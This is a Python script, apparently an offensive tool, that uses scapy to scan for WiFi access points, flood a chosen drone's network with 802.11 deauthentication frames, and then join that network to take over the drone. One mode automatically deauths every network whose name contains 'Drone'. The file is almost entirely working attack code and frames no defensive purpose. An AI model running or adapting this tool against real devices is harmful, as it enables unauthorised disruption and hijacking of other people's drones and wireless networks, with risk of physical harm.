#!/usr/bin/env python2
from scapy.all import * 
import re
import os 
import sys
import threading 
import wireless 
import time 
import swarm

class Deauth(threading.Thread):
    def __init__(self,mac=None):
        threading.Thread.__init__(self)
        self.mac=mac
        self.pkt=scapy.all.RadioTap()/scapy.all.Dot11(addr1="ff:ff:ff:ff:ff:ff",addr2=mac,addr3=mac)/scapy.all.Dot11Deauth()

    def run(self):
        for item in range(0,10):
            scapy.all.sendp(self.pkt, iface="mon0",count=1, inter=.2, verbose=0)
        print "Attack complete"

auto_target = 'Drone'
armed = 0
pkt_count = 20
pkt_all = 0
ap_list = []
interfaces = []

def get_interface():
   aa = wireless.Wireless() 
   return aa.interfaces() 


def hijack_drone(target,wint):
   os.system('iwconfig {0} essid {1}'.format(wint,target))
   time.sleep(1)
   os.system('dhclient {0}'.format(wint))
   
   

def monitor_manage(cmd):
   ints = get_interface() 
   for item in ints:
      if 'wlan' in item:
         wint = item
      if 'mon' in item and cmd == 'start':
         print("Monitor mode already enabled. Exiting")
         return
   if cmd == 'start':
      print('Initializing monitor mode [airmon method]')
      os.system('airmon-ng start {0}'.format(wint))
   elif cmd == 'stop':
      print('Stopping monitor mode [airmon method]')
      os.system('airmon-ng stop {0}'.format(wint))
   else:
      print('Unknown command or bad interface') 


def packet_process(pkt):
   global ap_list
   global pkt_all
   if pkt.haslayer(Dot11):
      if pkt.type == 0 and pkt.subtype == 8:
         if (pkt.addr2,pkt.info) not in ap_list:
            ap_list.append((pkt.addr2,pkt.info))
            pkt_all += 1

def stop_scan(x):
   global ap_list
   global target
   global armed 
   global pkt_all
   global pkt_count
   if pkt_all >= pkt_count:
      armed = 0
      return True
   else:
      return False 

def load_mon(interfaces):
   mon_interface = '' 
   for line in interfaces:
         if 'mon' in line:
            mon_interface = line
            return mon_interface


def seek_target():
   global armed 
   global interfaces
   mons = load_mon(interfaces)
   print(mons)
   i = 1 
   scapy.all.sniff(iface="mon0", prn=packet_process, stop_filter=stop_scan)
   if armed == 0:
      print('[+]Available targets')
      for item in ap_list:
         print('{0}: MAC: {1} SSID: {2}'.format(i,item[0],item[1]))
         i += 1
      print()
      i = input("Enter target: ")
      return int(i)
   else:
      return 0      



def gunner_mode():
   print('Starting target scanning...Ctrl+C to end early')
   monitor_manage('start')
   interfaces = get_interface()
   wl = '' 
   for item in interfaces:
      if 'wlan' in item:
         wl = item
         break
   targ_id = seek_target()
   Deauth(ap_list[targ_id - 1][0]).start()
   a = raw_input("Deauthing...hit enter when deauth tips you off")
   monitor_manage('stop')
   hijack_drone(ap_list[targ_id - 1][1],wl)
   swarm.demon_drone() 

def murica_mode():
   armed = 1
   monitor_manage('start')
   interfaces = get_interface()
   wl = ''
   for item in interfaces:
      if 'wlan' in item:
         wl = item
         break
   seek_target()
   for item in ap_list:
      if auto_target in item[1]:
         Deauth(item[0]).start() 
   

if len(sys.argv) < 2:
   print("{0} gunner|murica".format(sys.argv[0]))
   sys.exit(0)
sys.argv[1] == 'gunner' and gunner_mode()
sys.argv[1] == 'murica' and murica_mode() 

